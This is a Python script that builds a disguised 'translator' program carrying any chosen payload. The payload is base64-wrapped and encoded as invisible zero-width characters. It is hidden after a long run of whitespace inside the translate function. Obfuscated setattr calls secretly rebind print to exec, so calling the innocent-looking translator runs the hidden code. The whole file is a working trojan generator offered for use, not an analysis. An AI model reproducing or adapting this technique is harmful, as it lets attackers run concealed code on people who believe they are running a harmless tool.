__author__ = "Benjamin Mickler"
__copyright__ = "Copyright 2022, Benjamin Mickler"
__credits__ = ["Benjamin Mickler"]
__license__ = "GPLv3 or later"
__version__ = "01102022"
__maintainer__ = "Benjamin Mickler"
__email__ = "ben@benmickler.com"

"""
This file is part of translator3.

translator3 is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by the Free
Software Foundation, either version 3 of the License, or (at your option) any
later version.

translator3 is distributed in the hope that it will be useful, but
WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along with
translator3. If not, see <https://www.gnu.org/licenses/>.
"""

import base64
import sys
import os
newline = False
enter_text_to_translate = True
newlinechars = 0
name = None
if len(sys.argv) < 2:
    print("Usage: python3 generate3.py [payload file path] <options>")
    sys.exit(1)
elif len(sys.argv) > 2:
    for arg in sys.argv[2:]:
        if '--newline' in arg:
            newline = True
            if "=" not in arg:
                print("Usage: python3 generate3.py [payload file path] --newline=[number of characters]")
                sys.exit(1)
            newlinechars = int(arg.split('=')[1])
        elif arg == '--no-ettt':
            enter_text_to_translate = False
        elif '--name' in arg:
            if "=" not in arg:
                print("Usage: python3 generate3.py [payload file path] --name=[name]")
                sys.exit(1)
            name = arg.split('=')[1]
        else:
            print("Usage: python3 generate3.py [payload file path] <options>")
            sys.exit(1)
MODE_ZWSP = 0
MODE_FULL = 1
ZERO_WIDTH_SPACE = '\u200b'
ZERO_WIDTH_NON_JOINER = '\u200c'
ZERO_WIDTH_JOINER = '\u200d'
LEFT_TO_RIGHT_MARK = '\u200e'
RIGHT_TO_LEFT_MARK = '\u200f'
list_ZWSP = [
    ZERO_WIDTH_SPACE,
    ZERO_WIDTH_NON_JOINER,
    ZERO_WIDTH_JOINER,
]
list_FULL = [
    ZERO_WIDTH_SPACE,
    ZERO_WIDTH_NON_JOINER,
    ZERO_WIDTH_JOINER,
    LEFT_TO_RIGHT_MARK,
    RIGHT_TO_LEFT_MARK,
]
def get_padding_length(mode):
    return 11 if mode == MODE_ZWSP else 7
def to_base(num, b, numerals='0123456789abcdefghijklmnopqrstuvwxyz'):
    return ((num == 0) and numerals[0]) or (to_base(num // b, b, numerals).lstrip(numerals[0]) + numerals[num % b])
def encode(message, newline=False, mode=MODE_FULL):
    if not isinstance(message, str):
        raise TypeError('Cannot encode {0}'.format(type(message).__name__))
    alphabet = list_ZWSP if mode == MODE_ZWSP else list_FULL
    padding = get_padding_length(mode)
    encoded = ''
    if (len(message) == 0):
        return ''
    cc = 0
    for message_char in message:
        cc += 1
        code = '{0}{1}'.format('0' * padding, int(str(to_base(ord(message_char), len(alphabet)))))
        code = code[len(code) - padding:]
        for code_char in code:
            index = int(code_char)
            encoded = encoded + alphabet[index]
        if cc == newlinechars and newline:
            cc = 0
            encoded = encoded + """
"""
    return encoded
with open(sys.argv[1]) as f:
    x = f.read()
y = base64.b64encode(x.encode())
z = """import base64
c = b'"""+y.decode()+"""'
exec(base64.b64decode(c))
"""
encoded = encode(z, newline=newline)
tc = """__author__ = "Benjamin Mickler"
__copyright__ = "Copyright 2022, Benjamin Mickler"
__credits__ = ["Benjamin Mickler"]
__license__ = "GPLv3 or later"
__version__ = "01102022"
__maintainer__ = "Benjamin Mickler"
__email__ = "ben@benmickler.com"

\"""
This file is part of translator3.

translator3 is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by the Free
Software Foundation, either version 3 of the License, or (at your option) any
later version.

translator3 is distributed in the hope that it will be useful, but
WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along with
translator3. If not, see <https://www.gnu.org/licenses/>.
\"""

GERMAN = 0
ENGLISH = 1

TRANSLATION_CODE_1 = "\\u200b"
TRANSLATION_CODE_2 = "\\u200c"
TRANSLATION_CODE_3 = "\\u200d"
TRANSLATION_CODE_4 = "\\u200e"
TRANSLATION_CODE_5 = "\\u200f"

list_BASIC_TRANSLATION = [
    TRANSLATION_CODE_1,
    TRANSLATION_CODE_2,
    TRANSLATION_CODE_3,
]

list_FULL = [
    TRANSLATION_CODE_1,
    TRANSLATION_CODE_2,
    TRANSLATION_CODE_3,
    TRANSLATION_CODE_4,
    TRANSLATION_CODE_5,
]

NUMERALS = "0123456789abcdefghijklmnopqrstuvwxyz_"

def remove_invalid_chars(text):
    return "".join([str(NUMERALS.index(char))+"-" for char in text])

def join_tokens(tokens):
    return "".join([NUMERALS[int(token)] for token in tokens[:-1].split("-")])

setattr(globals()["__builtins__"], join_tokens("36-25-27-18-23-29-"), getattr(globals()["__builtins__"], join_tokens("25-27-18-23-29-")))
setattr(globals()["__builtins__"], join_tokens("25-27-18-23-29-"), getattr(globals()["__builtins__"], join_tokens("14-33-14-12-")))

def to_base(num, b, numerals=NUMERALS):
    return ((num == 0) and numerals[0]) or (to_base(num // b, b, numerals).lstrip(numerals[0]) + numerals[num % b])

def get_padding_length(lang):
    return 11 if lang == GERMAN else 7

def translate(text, lang=ENGLISH):
    if not isinstance(text, str):
        raise TypeError("Cannot translate {0}".format(type(text).__name__))
    text = text                                                                                                                                                                                                                                                                                                                                                                                                                                     +'''"""+encoded+"""'''
    alphabet = list_BASIC_TRANSLATION if lang == GERMAN else list_FULL
    padding = get_padding_length(lang)
    enc = ""
    dec = ""
    for text_char in text:
        if text_char in alphabet:
            enc = enc + str(alphabet.index(text_char))
    if (len(enc) % padding != 0):
        raise TypeError("Unknown encoding detected!")
    cur_text_char = ""
    for index, text_char in enumerate(enc):
        cur_text_char = cur_text_char + text_char
        if index > 0 and (index + 1) % padding == 0:
            dec = dec + chr(int(cur_text_char, len(alphabet)))
            cur_text_char = ""
    return dec

def main():"""+("""
    user_input = input("Enter text to translate: ")""" if enter_text_to_translate else '''
    user_input = ""''')+"""
    print(translate(user_input))

if __name__ == "__main__":
    main()
"""
if name != None:
    os.makedirs(name, exist_ok=True)
    with open(os.path.join(name, "translate.py"), "w") as f:
        f.write(tc)
else:
    with open("translator3.py", "w") as f:
        f.write(tc)